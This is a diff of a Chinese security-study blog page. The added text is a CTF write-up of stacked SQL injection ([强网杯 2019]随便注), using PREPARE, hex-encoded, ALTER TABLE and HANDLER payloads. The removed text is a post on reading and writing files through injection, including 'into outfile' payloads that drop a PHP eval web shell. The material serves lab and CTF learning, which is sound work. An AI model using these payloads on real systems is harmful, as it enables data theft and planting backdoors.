+        <h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/[GYCTF2020]Blacklist/" data-id="cmaxy8gcj003xkg7k7z707w2i" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/[强网杯 2019]随便注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><blockquote>
+<p>先判断注入点的传参方式，发现是get传参。</p>
+</blockquote>
+<blockquote>
+<p>判断闭合方式：输入1再输入1’试试	，发现是字符型且闭合方式是单引号</p>
+</blockquote>
+<blockquote>
+<p>判断一下字符个数<code>&#39; union select 1,2;#</code>​，系统提示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>​</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;select&#x3D;&#x3D;关键字无法使用，我们可以通过&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;的方式，来绕过select关键字。</p>
+</blockquote>
+<blockquote>
+<p>&#x3D;&#x3D;查看数据库名：&#x3D;&#x3D;​<code>1&#39;;show databases;#</code>​</p>
+</blockquote>
+<p><img src="/.com//image-20250418170120-z5w8c3n.png" alt="image">​</p>
+<blockquote>
+<p>&#x3D;&#x3D;查看数据表：&#x3D;&#x3D;​<code>1&#39;;show tables;#</code>​</p>
+</blockquote>
+<p><img src="/.com//image-20250418170223-5ylj1zk.png" alt="image"></p>
+<blockquote>
+<p>查看表结构：</p>
+<p>方式一：<code>1&#39;; show columns from tableName;#</code>​</p>
+<p>方式二：<code>1&#39;;desc tableName;#</code>​</p>
+<p>注意，如果tableName是纯数字，需要用反引号包裹</p>
+</blockquote>
+<p><img src="/.com//image-20250418170425-ugseo8r.png" alt="image"></p>
+<blockquote>
+<p>因为select关键字被过滤了，所以我们可以通过&#x3D;&#x3D;预编译&#x3D;&#x3D;的方式&#x3D;&#x3D;拼接&#x3D;&#x3D;select 关键字：<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE  hacker;#</code>​得flag：flag{c0fc32ff-8ae1-4b96-8da0-1f621d7fdae3}  （关于预编译的讲解请见下文）</p>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote>
+<p>前几步和方法一一致，最后一步（第8步），我们可以直接将<code>select * from `1919810931114514` </code>​语句进行16进制编码，即：<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>​，替换payload：</p>
+<p>​<code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE  hacker;#</code>​</p>
+<p>同时，我们也可以先定义一个变量并将sql语句初始化，然后调用</p>
+<p>​<code>1&#39;;Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#</code>​</p>
+</blockquote>
+<p>‍</p>
+<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><blockquote>
+<p>最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为<code>id</code>​我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：<code>1&#39;;  alter table words rename to words1;alter table `1919810931114514`  rename to words;alter table words change flag id varchar(50);# </code>​，然后通过<code>1&#39; or 1 = 1 #</code>​，成功获取到flag。 （关于更改表名的讲解请见下文）</p>
+</blockquote>
+<p>‍</p>
+<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><blockquote>
+<p>此题还可以通过&#x3D;&#x3D;handle&#x3D;&#x3D;直接出答案：<code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</code>​</p>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
+<h1 id="知识详解"><a href="#知识详解" class="headerlink" title="知识详解"></a>知识详解</h1><h2 id="1-预编译"><a href="#1-预编译" class="headerlink" title="1.预编译"></a>1.预编译</h2><p>预编译相当于定一个语句相同，参数不通的&#x3D;&#x3D;mysql&#x3D;&#x3D;模板，我们可以通过预编译的方式，绕过特定的字符过滤</p>
+<p>格式：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE 名称 FROM 	Sql语句 ? ;</span><br><span class="line">SET @x=xx;</span><br><span class="line">EXECUTE 名称 USING @x;</span><br></pre></td></tr></table></figure>
+
+<p>举例：查询ID为1的用户：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">SElECT * FROM t_user WHERE USER_ID = 1</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">PREPARE jia FROM &#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">EXECUTE jia;</span><br><span class="line"></span><br><span class="line">方法三：</span><br><span class="line">PREPARE jia FROM &#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;;</span><br><span class="line">SET @ID = 1;</span><br><span class="line">EXECUTE jia USING @ID;</span><br><span class="line"></span><br><span class="line">方法四：</span><br><span class="line">SET @SQL=&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">PREPARE jia FROM @SQL;</span><br><span class="line">EXECUTE jia;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-更改表名"><a href="#2-更改表名" class="headerlink" title="2. 更改表名"></a>2. 更改表名</h2><ul>
+<li>修改表名：<code>ALTER TABLE 旧表名 RENAME TO 新表名；</code>​</li>
+<li>修改字段：<code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</code>​</li>
+</ul>
+<h2 id="3-handle"><a href="#3-handle" class="headerlink" title="3.handle"></a>3.handle</h2><ul>
+<li>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">打开表：</span><br><span class="line">HANDLER 表名 OPEN ;</span><br><span class="line"></span><br><span class="line">查看数据：</span><br><span class="line">HANDLER 表名 READ next;</span><br><span class="line"></span><br><span class="line">关闭表：</span><br><span class="line">HANDLER 表名 READ CLOSE;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/" data-id="cmaxy8gck0040kg7k8rdsce97" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -235,7 +308,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/Cookie%20%E6%B3%A8%E5%85%A5/" data-id="cmawczpoi003sik7kath777uw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/Cookie%20%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gcl0043kg7kc6zr3usx" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -274,7 +347,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" data-id="cmawczpom0043ik7kbuam4247" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gcm004akg7k17kb2ne7" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -345,7 +418,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" data-id="cmawczpoo0045ik7k3cooarl8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gcn004fkg7kei63c4s5" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -375,7 +448,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" data-id="cmawczpop0046ik7kfz91269o" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gct004ukg7kcqu1b3tq" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -445,7 +518,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" data-id="cmawczpop0047ik7k0dd90ya3" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" data-id="cmaxy8gct004vkg7kgusa3n7s" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -555,104 +628,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" data-id="cmawczpop0048ik7k346rdt7h" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/文件读写" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h1><h3 id="1-union-注入读取文件"><a href="#1-union-注入读取文件" class="headerlink" title="1. union 注入读取文件"></a>1. union 注入读取文件</h3><hr>
-<p><strong>注</strong>：当有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取；</p>
-<p>文件写入只能利用 union 注入</p>
-<p>示例：读取系统根目录下的&#x2F;demo.txt 文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//union注入读取 /demo.txt 文件,windows使用-&gt;盘符:/路径</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,load_file(&quot;demo.txt&quot;) -- +</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//也可以把 /demo.txt 转换成16进制 这里没成功，可以去找找资料。。。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="keyword">select</span> 1,2,load_file(0x2F64656D6F2E747874) -- +</span><br></pre></td></tr></table></figure>
-
-<p>如果不成功，参考以下解决方案 在 mysql 目录中找到 my.ini&#x2F;my.cnf 文件在[mysqld]下面添加如下内容secure_file_priv &#x3D; “”如图：</p>
-<p>登录 mysql 执行以下命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SHOW VARIABLES LIKE <span class="string">&quot;secure_file_priv&quot;</span>;</span><br><span class="line"></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
-
-<p>这里<code>secure_file_priv</code>​的值要为””或者 “&#x2F;“ secure_file_priv 有三个值</p>
-<p>1、限制 mysqld 不允许导入 | 导出</p>
-<p>​<code>mysqld –secure_file_prive=null</code>​</p>
-<p>2、限制 mysqld 的导入 | 导出 只能发生在&#x2F;tmp&#x2F;目录下</p>
-<p>​<code>mysqld –secure_file_priv=/tmp/</code>​</p>
-<p>3、不对 mysqld 的导入 | 导出做限制</p>
-<p>​<code>secure_file_priv=&#39;&#39;</code>​</p>
-<hr>
-<h3 id="2-盲注读取文件"><a href="#2-盲注读取文件" class="headerlink" title="2. 盲注读取文件"></a>2. 盲注读取文件</h3><hr>
-<p>盲注读取的话就是利用hex函数，将读取的字符串转换成 16 进制，再利用ascii函数，转换成 ascii 码，再利用二分法一个一个的判断字符，很复杂，一般结合工具完成</p>
-<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; and ascii(mid((select hex(load_file(&#39;e:/3.txt&#39;))),18,1))&gt;49#&#39; LIMIT 0,1</code>​</p>
-<p>我们可以利用写入文件的功能，在 e 盘创建 4.php 文件，然后写入一句话木马。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//利用union注入写入一句话木马 into outfile 和 into dumpfile 都可以</span><br><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,&#x27;</span>&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[aaa]);?&gt;<span class="string">&#x27; into outfile &#x27;</span>d:/4.php<span class="string">&#x27; -- +</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 可以将一句话木马转换成16进制的形式</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="keyword">select</span> 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e into outfile <span class="string">&#x27;d:/4.php&#x27;</span> -- +</span><br></pre></td></tr></table></figure>
-
-<p>在文件写入读取的时候，遇见以下这种情况。</p>
-<p><img src="/.com//image-20250519092519-0kcit26.png" alt="image"></p>
-<p>多半是因为权限不足，可以使用@@datadir，得到当前数据库存储目录，试着在数据库存储目录进行文件注入 比如</p>
-<p>​<code>http://192.168.209.128:88/Less-1/?id=-1&#39; union select 1,2,&#39;&lt;?php @eval($_POST[aaa]);?&gt;&#39; into outfile &#39;/www/server/mysql/4.php&#39; --</code>​</p>
-<p><img src="/.com//image-20250519092538-50xr08l.png" alt="image"></p>
-<p>注入成功</p>
-<p><strong>权限不足的解决办法-参考</strong>环境： CentOS7.0 64 位 MySQL5.7 问题：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用&#x27;select into outfile&#x27;备份数据表提示无法写入文件</span></span><br><span class="line">mysql&gt; <span class="keyword">select</span> 1,2,<span class="string">&#x27;you are very good hacker&#x27;</span> from  into outfile <span class="string">&#x27;/www/server/mysql/app.txt&#x27;</span>;</span><br><span class="line">ERROR 1 (HY000): Can<span class="string">&#x27;t create/write to file &#x27;</span>/www/server/mysql/app.txt<span class="string">&#x27; (Errcode: 13)</span></span><br></pre></td></tr></table></figure>
-
-<p>排查：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看mysql的进程用户,为mysql用户</span></span><br><span class="line">[root@lfs ~]# ps aux|grep mysqld</span><br><span class="line">root       1400  0.0  0.1 108208  1612 ?        S    01:22   0:00 /bin/sh /usr/local/mysql/bin/mysqld_safe --user=mysql</span><br><span class="line">mysql      1778  0.0  6.6 974276 67076 ?        Sl   01:22   0:06 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/lfs.err --pid-file=/usr/local/mysql/data/lfs.pid --socket=/tmp/mysql.sock --port=3306</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看/www/server/mysql/目录的权限，mysql用户没有写入权限</span></span><br><span class="line">[root@lfs ~]# <span class="built_in">ls</span> -ld /www/server/mysql/</span><br><span class="line">drwxr-xr-x 4 root root 4096 Aug 23 17:03 /www/server/mysql/</span><br></pre></td></tr></table></figure>
-
-<p>解决办法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将/data/mysql/目录的归属为mysql用户</span></span><br><span class="line"><span class="built_in">chown</span> -R mysql.mysql /www/server/mysql/</span><br><span class="line"></span><br><span class="line">[root@lfs ~]# <span class="built_in">ls</span> -ld /data/mysql/</span><br><span class="line">drwxr-xr-x 4 mysql mysql 4096 Aug 23 17:03 /www/server/mysql/</span><br></pre></td></tr></table></figure>
-
-<p>验证，写入成功：</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" data-id="cmawczpor004cik7k9e2s2fkz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/[GYCTF2020]Blacklist" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5BGYCTF2020%5DBlacklist/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/[GYCTF2020]Blacklist/" data-id="cmawczpos004eik7k9dnl89lv" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" data-id="cmaxy8gcu004wkg7kdwq319vg" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -725,19 +701,19 @@
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
-          </li>
-        
-          <li>
             <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/">(no title)</a>
           </li>
         
       </ul>
